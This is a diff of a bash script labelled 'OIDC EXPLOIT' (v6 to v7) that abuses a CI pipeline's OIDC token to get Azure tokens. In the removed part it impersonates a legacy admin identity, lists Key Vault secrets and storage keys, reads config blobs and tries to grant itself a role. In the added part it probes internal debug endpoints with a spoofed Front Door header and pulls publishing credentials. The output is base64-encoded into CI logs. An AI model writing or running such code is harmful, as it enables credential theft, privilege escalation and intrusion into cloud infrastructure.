@@ -1,160 +1,108 @@
 #!/bin/bash
 set -uo pipefail
 
-echo "=== OIDC EXPLOIT v6 - LEGACY-ADMIN OIDC ==="
+echo "=== OIDC EXPLOIT v7 - WEB ACCESS FROM CI ==="
 
 T="${AZURE_TENANT_ID}"
 SUB="${AZURE_SUBSCRIPTION_ID}"
 
-# === PART A: Auth as LEGACY-ADMIN via OIDC ===
-# legacy-admin has FIC (base-pipe) matching upstream PR subject
-LA_CID="891fb158-e02c-4428-a885-53b811f369c0"
+# === PART A: Try reaching the web apps from Azure network ===
+echo "=== REPORTING APP DIRECT ==="
+curl -sS --connect-timeout 8 -m 15 \
+  "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1 | head -c 300
+echo ""
 
-OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
-echo "oidc_len=${#OIDC}"
+echo "=== REPORTING APP WITH FDID ==="
+curl -sS --connect-timeout 8 -m 15 \
+  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
+  "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1 | head -c 300
+echo ""
 
-# Decode OIDC subject for debugging
-echo "=== OIDC SUBJECT ==="
-echo "$OIDC" | cut -d. -f2 | python3 -c "
-import sys,base64,json
-p=sys.stdin.read().strip()+'=='
-d=json.loads(base64.b64decode(p))
-print('sub:',d.get('sub',''))
-print('aud:',d.get('aud',''))
-print('iss:',d.get('iss',''))
-print('repo:',d.get('repository',''))
-" 2>/dev/null || true
+echo "=== DEBUG ENDPOINT WITH FDID ==="
+curl -sS --connect-timeout 8 -m 15 \
+  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
+  -H "Content-Type: application/json" \
+  -d '{"expr":"settings"}' \
+  -X POST \
+  "https://app-tbl-reporting-prod.azurewebsites.net/internal/debug" 2>&1 | head -c 1000
+echo ""
 
-# ARM token as legacy-admin
-echo "=== LEGACY-ADMIN ARM ==="
-LA_ARM_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "grant_type=client_credentials" \
-  -d "client_id=$LA_CID" \
-  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC" \
-  -d "scope=https://management.azure.com/.default" 2>&1)
-LA_ARM=$(echo "$LA_ARM_RESP" | jq -r '.access_token // empty')
-echo "la_arm_len=${#LA_ARM}"
-[ -z "$LA_ARM" ] && echo "LA_ARM_ERR=$(echo "$LA_ARM_RESP" | jq -r '.error_description // empty' | head -c 200)"
+echo "=== STOREFRONT DIRECT ==="
+curl -sS --connect-timeout 8 -m 15 \
+  "https://app-tbl-storefront-prod.azurewebsites.net/" 2>&1 | head -c 300
+echo ""
 
-if [ -n "$LA_ARM" ]; then
-  echo "=== LA ARM CLAIMS ==="
-  echo "$LA_ARM" | cut -d. -f2 | python3 -c "
-import sys,base64,json
-p=sys.stdin.read().strip()+'=='
-d=json.loads(base64.b64decode(p))
-for k in ('aud','appid','oid','roles','wids','scp'):
-    if k in d: print(f'{k}: {d[k]}')
-" 2>/dev/null || true
+echo "=== STOREFRONT WITH FDID ==="
+curl -sS --connect-timeout 8 -m 15 \
+  -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" \
+  "https://app-tbl-storefront-prod.azurewebsites.net/" 2>&1 | head -c 300
+echo ""
 
-  # What can legacy-admin see?
-  echo "=== LA SUBSCRIPTIONS ==="
-  curl -sS -H "Authorization: Bearer $LA_ARM" \
-    "https://management.azure.com/subscriptions?api-version=2022-12-01" | base64 -w0
-  echo ""
+echo "=== FRONT DOOR ==="
+curl -sS --connect-timeout 8 -m 15 \
+  "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/" 2>&1 | head -c 300
+echo ""
 
-  echo "=== LA ROLE ASSIGNMENTS ==="
-  curl -sS -H "Authorization: Bearer $LA_ARM" \
-    "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | base64 -w0
-  echo ""
+echo "=== FRONT DOOR DEBUG ==="
+curl -sS --connect-timeout 8 -m 15 \
+  -H "Content-Type: application/json" \
+  -d '{"expr":"settings"}' \
+  -X POST \
+  "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/internal/debug" 2>&1 | head -c 500
+echo ""
 
-  echo "=== LA STORAGE LISTKEYS ==="
-  curl -sS -X POST -H "Authorization: Bearer $LA_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | base64 -w0
-  echo ""
-
-  echo "=== LA REPORTING APPSETTINGS ==="
-  curl -sS -X POST -H "Authorization: Bearer $LA_ARM" -H "Content-Length: 0" \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01" | base64 -w0
-  echo ""
-
-  echo "=== LA ALL RESOURCES ==="
-  curl -sS -H "Authorization: Bearer $LA_ARM" \
-    "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | base64 -w0
-  echo ""
-
-  echo "=== LA CREATE ROLE ASSIGNMENT ==="
-  ASSIGN_ID=$(python3 -c "import uuid;print(uuid.uuid4())")
-  # Try adding Storage Blob Data Reader for LA SP on appcfg storage
-  LA_OID=$(echo "$LA_ARM" | cut -d. -f2 | python3 -c "import sys,base64,json;p=sys.stdin.read().strip()+'==';print(json.loads(base64.b64decode(p)).get('oid',''))" 2>/dev/null)
-  curl -sS -X PUT -H "Authorization: Bearer $LA_ARM" -H "Content-Type: application/json" \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/providers/Microsoft.Authorization/roleAssignments/$ASSIGN_ID?api-version=2022-04-01" \
-    -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/2a2b9908-6ea1-4ae2-8e65-a410df84e7d1\",\"principalId\":\"$LA_OID\",\"principalType\":\"ServicePrincipal\"}}" | base64 -w0
-  echo ""
-fi
-
-# Storage token as legacy-admin
-OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
-echo "=== LEGACY-ADMIN STORAGE ==="
-LA_ST_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "grant_type=client_credentials" \
-  -d "client_id=$LA_CID" \
-  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC2" \
-  -d "scope=https://storage.azure.com/.default")
-LA_ST=$(echo "$LA_ST_RESP" | jq -r '.access_token // empty')
-echo "la_st_len=${#LA_ST}"
-[ -z "$LA_ST" ] && echo "LA_ST_ERR=$(echo "$LA_ST_RESP" | jq -r '.error_description // empty' | head -c 200)"
-
-if [ -n "$LA_ST" ]; then
-  echo "=== LA BLOB READ ==="
-  curl -sS -H "Authorization: Bearer $LA_ST" -H "x-ms-version: 2021-08-06" \
-    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | base64 -w0
-  echo ""
-fi
-
-# KV token as legacy-admin
-OIDC3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
-echo "=== LEGACY-ADMIN KV ==="
-LA_KV_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
-  -d "grant_type=client_credentials" \
-  -d "client_id=$LA_CID" \
-  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC3" \
-  -d "scope=https://vault.azure.net/.default")
-LA_KV=$(echo "$LA_KV_RESP" | jq -r '.access_token // empty')
-echo "la_kv_len=${#LA_KV}"
-
-if [ -n "$LA_KV" ]; then
-  echo "=== LA KV-SEC SECRETS ==="
-  curl -sS -H "Authorization: Bearer $LA_KV" \
-    "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | base64 -w0
-  echo ""
-
-  echo "=== LA KV-PROD SECRETS ==="
-  curl -sS -H "Authorization: Bearer $LA_KV" \
-    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | base64 -w0
-  echo ""
-fi
-
-# === PART B: Also try cicd-deployer for v5 queries ===
+# === PART B: Use ARM to get FDID and app URLs ===
 CID="${AZURE_CLIENT_ID}"
-OIDC4=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
 ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
   -d "grant_type=client_credentials" -d "client_id=$CID" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC4" \
+  -d "client_assertion=$OIDC" \
   -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
-echo "cicd_arm_len=${#ARM}"
 
-echo "=== CICD ALL RESOURCES ==="
+echo "=== AFD PROFILE ==="
 curl -sS -H "Authorization: Bearer $ARM" \
-  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | base64 -w0
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod?api-version=2024-02-01" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+print('FDID:', d.get('properties',{}).get('frontDoorId',''))
+print('state:', d.get('properties',{}).get('provisioningState',''))
+" 2>/dev/null || true
 echo ""
 
-echo "=== CICD RESOURCE GROUPS ==="
+echo "=== AFD ENDPOINTS ==="
 curl -sS -H "Authorization: Bearer $ARM" \
-  "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | base64 -w0
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints?api-version=2024-02-01" | base64 -w0
 echo ""
 
-echo "=== CICD STORAGE PROPS ==="
+echo "=== AFD ORIGIN GROUPS ==="
 curl -sS -H "Authorization: Bearer $ARM" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz?api-version=2023-01-01" | base64 -w0
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/originGroups?api-version=2024-02-01" | base64 -w0
+echo ""
+
+echo "=== AFD ROUTES ==="
+curl -sS -H "Authorization: Bearer $ARM" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints/tbl-storefront-prod/routes?api-version=2024-02-01" | base64 -w0
+echo ""
+
+echo "=== STOREFRONT APP PROPS ==="
+curl -sS -H "Authorization: Bearer $ARM" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+p=d.get('properties',{})
+print('state:', p.get('state',''))
+print('hostNames:', p.get('hostNames',[]))
+print('siteConfig:', json.dumps(p.get('siteConfig',{}))[:500])
+print('identity:', json.dumps(d.get('identity',{})))
+" 2>/dev/null || true
+echo ""
+
+echo "=== STOREFRONT PUBLISH CREDS ==="
+curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2022-03-01" 2>&1 | head -c 500
 echo ""
 
 echo ""
-echo "=== DONE v6 ==="
+echo "=== DONE v7 ==="
